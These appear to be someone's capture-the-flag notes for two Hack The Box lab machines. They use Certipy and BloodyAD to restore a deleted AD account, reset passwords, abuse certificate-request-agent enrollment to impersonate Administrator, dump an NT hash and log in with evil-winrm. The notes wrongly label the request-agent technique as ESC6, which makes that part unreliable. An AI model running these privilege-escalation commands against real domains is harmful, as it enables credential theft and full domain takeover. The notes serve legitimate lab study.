# Notes: Restoring a Deleted AD User and Resetting Password

## Goal

Restore a deleted user account (`cert_admin`) from the "Deleted Objects" container and reset its password.

---

## Step 1: Restore the Deleted Object

Use the full **DistinguishedName** from the tombstoned object.  
Replace `<GUID>` with the GUID of the deleted instance you want to restore.

```powershell
Restore-ADObject -Identity "CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb"
```
- This restores the specific deleted instance of `cert_admin` with GUID `938182c3-bf0b-410a-9aaa-45c8e1a02ebf`.

- This is how AD uniquely identifies and tracks deleted objects (tombstones), using:
- The original CN
- The \0ADEL: delimiter
- A unique GUID (here: 938182c3-bf0b-410a-9aaa-45c8e1a02ebf)
- The zero (\0) is a null character.
- The full string (\0ADEL:...) is appended to the CN to avoid naming collisions in the Deleted Objects container.

---

## Step 2: Reset the Restored User's Password

After restoring, use the **sAMAccountName** (may need to specify the correct OU/location if there are duplicates):

```powershell
Set-ADAccountPassword -Identity "cert_admin" -Reset -NewPassword (ConvertTo-SecureString "DeadSecOps" -AsPlainText -Force)
```

- This resets the password for the account to `DeadSecOps`

---

## Notes

- If there are multiple `cert_admin` accounts or naming conflicts, specify the full DistinguishedName when resetting the password:

```powershell
Set-ADAccountPassword -Identity "CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb" -Reset -NewPassword (ConvertTo-SecureString "DeadSecOps" -AsPlainText -Force)
```

- The restored object should reappear in its original container as per the `LastKnownParent` attribute (e.g., `OU=ADCS,DC=tombwatcher,DC=htb`).

---

## References

- [Restore-ADObject](https://learn.microsoft.com/en-us/powershell/module/activedirectory/restore-adobject)
- [Set-ADAccountPassword](https://learn.microsoft.com/en-us/powershell/module/activedirectory/set-adaccountpassword)

---

# Certipy-AD Enumeration & Vulnerability Discovery (WebServer Template)

## Command Used

```bash
certipy-ad find -vulnerable  -u 'cert_admin@tombwatcher.htb' -p 'DeadSecOps' -dc-ip 10.10.11.72 -output certipy_results
```

---

## What Happened

- **Certipy-AD** was used to enumerate Active Directory Certificate Services (ADCS) configuration and templates.
- Found and exported info on certificate authorities, templates, issuance policies, and vulnerabilities.

---

## Certificate Authority

- **Name:** tombwatcher-CA-1
- **DNS Name:** DC01.tombwatcher.htb
- **Owner:** TOMBWATCHER.HTB\Administrators
- **Web Enrollment:** Disabled (HTTP/HTTPS)
- **Enrollment:** All `Authenticated Users` can enroll

---

## Notable Certificate Template: **WebServer**

- **Template Name:** WebServer
- **Enabled:** True
- **Certificate Authorities:** tombwatcher-CA-1
- **Enrollee Supplies Subject:** True
- **Extended Key Usage:** Server Authentication
- **Minimum RSA Key Length:** 2048
- **Validity:** 2 years
- **User Enrollable Principals:**  
  - `TOMBWATCHER.HTB\cert_admin` (**you**)

### Permissions

- **Enrollment Rights:**  
  - Domain Admins  
  - Enterprise Admins  
  - cert_admin  
- **Full Control / Write Owner / Write Dacl:**  
  - Domain Admins  
  - Enterprise Admins  
- **Write Property Enroll:**  
  - Domain Admins  
  - Enterprise Admins  
  - cert_admin  

---

## Vulnerabilities

- **ESC15** (Enrollee supplies subject, schema version 1)
    - This can be abused if the environment is unpatched (see CVE-2024-49019).
    - **Note:** Only applicable if the CA is not patched for ESC15.

---

## Exploitation Path

- **As `cert_admin`, you can enroll for the `WebServer` template**.
- If ESC15 is not patched, you may abuse it for privilege escalation or authentication relay.
- For exploitation steps, see:
  - [CVE-2024-49019 - ESC15 Wiki](https://github.com/ly4k/Certipy/wiki/ESC15)

---

## Next Steps

1. **Attempt to abuse ESC15 as `cert_admin`:**
    - Use Certipy or Rubeus to request a certificate with a crafted subject.
2. **Verify if the CA is patched** for ESC15.
3. **Monitor for other templates** or new permissions as you escalate.

---

## References

- [Certipy GitHub](https://github.com/ly4k/Certipy)
- [ESC15 / CVE-2024-49019 details](https://github.com/ly4k/Certipy/wiki/ESC15)

# Certificate Request via Certipy (Request Agent OID)

## Command Used

```bash
certipy-ad req -u 'cert_admin@tombwatcher.htb' -p 'DeadSecOps' -dc-ip '10.10.11.72' -target 'dc01.tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'WebServer' -application-policies 'Certificate Request Agent' 
```

---

## Output

```
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 3
[*] Successfully requested certificate
[*] Got certificate without identity
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'cert_admin.pfx'
[*] Wrote certificate and private key to 'cert_admin.pfx'
```

---

## Notes

- **Template Used:** WebServer
- **Application Policies OID:** 'Certificate Request Agent'
- **Certificate Identity:** No UPN or SID present in this certificate (i.e., not directly usable for authentication as a user).
- **Tip:** If you need to impersonate a specific account, use `-upn` and `-sid` flags to set UPN and object SID.
- **File Saved:** `cert_admin.pfx`

---

## Reference

- [Certipy Wiki - Certificate Request Agent Abuse](https://github.com/ly4k/Certipy/wiki/ESC6)
- [Certipy GitHub](https://github.com/ly4k/Certipy)

---

# Certificate Abuse: ESC6 Attack to Domain Admin

You were right—the `WebServer` template was likely not necessary. The key to the ESC6 attack is abusing the **Certificate Request Agent** right. You can typically request this using any template you have enrollment rights for, including the default `User` template.

The attack leverages this misconfiguration to request a certificate on behalf of a privileged user, leading to a full domain compromise.

---

### Step 1: Find a Vulnerable Certificate Template (Reconnaissance)

The first step in a real scenario would be to find a vulnerable template. Using Certipy, you would identify templates where your current user (`cert_admin`) has enrollment rights and which are configured for **Certificate Request Agent** (ESC6) abuse.

```bash
certipy-ad find -u 'cert_admin@tombwatcher.htb' -p 'DeadSecOps' -dc-ip '10.10.11.72'
````

-----

### Step 2: Request the "Request Agent" Certificate

Next, you enroll as `cert_admin` to obtain a certificate with the "Certificate Request Agent" policy. This certificate (`cert_admin.pfx`) cannot be used to authenticate but acts as a signing certificate to request other certificates on behalf of users.

```bash
# Request a certificate with the "Certificate Request Agent" policy using the User template
certipy-ad req -u 'cert_admin@tombwatcher.htb' -p 'DeadSecOps' \
  -ca 'tombwatcher-CA-1' -target 'dc01.tombwatcher.htb' \
  -template 'User' -application-policies 'Certificate Request Agent'
```

*This saves the agent certificate as `cert_admin.pfx`.*

-----

### Step 3: Request a Certificate on Behalf of the Administrator

Now, use the agent certificate (`cert_admin.pfx`) to request a new certificate, this time for the domain administrator. The Certificate Authority validates that `cert_admin.pfx` is authorized for this action and issues an authentication certificate for the `Administrator` account.

```bash
# Use the agent certificate to request a certificate for the Administrator
certipy-ad req -pfx 'cert_admin.pfx' \
  -ca 'tombwatcher-CA-1' -target 'dc01.tombwatcher.htb' \
  -template 'User' -on-behalf-of 'TOMBWATCHER\Administrator'
```

*This saves the administrator's certificate as `administrator.pfx`.*

-----

### Step 4: Authenticate as Administrator & Dump Hash

With the administrator's certificate (`administrator.pfx`), you can authenticate to the domain controller to get a Kerberos Ticket-Granting Ticket (TGT). This allows you to perform privileged actions, such as dumping the administrator's NTLM hash.

A clock skew issue required using `faketime` to synchronize with the server.

```bash
# Authenticate with the administrator's certificate to get a TGT
faketime 'now + 4 hours' certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.10.11.72'
```

  * **Success\!** A TGT for `administrator@tombwatcher.htb` was obtained.
  * **NT Hash Dumped:** `f61db423bebe3328d33af26741afe5fc`

-----

### Step 5: Gain Privileged Access

The TGT cache file (`administrator.ccache`) can be used with tools like `psexec.py`, `smbexec.py`, or, in this case, `evil-winrm` to gain privileged access to the domain controller.

```powershell
# Using Evil-WinRM with the Kerberos ticket to access the server
export KRB5CCNAME=administrator.ccache
evil-winrm -i 10.10.11.72

# Navigate and capture the flag
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
6903bf970ef1d64d0fad3559053ecb95
```

---

# Notes: Resetting a User Password on Puppy with BloodyAD

```bash
┌──(jrios㉿warmonger)-[~/Documents/HTB/Machines/Puppy]
└─$ bloodyAD --host puppy.htb --dc-ip 10.10.11.70 -d puppy.htb -u ant.edwards -p 'Antman2025!' set password adam.silver 'DeadSec0ps'
[+] Password changed successfully!
```

This demonstrates using BloodyAD to reset another user's password in Active Directory when you have sufficient rights.
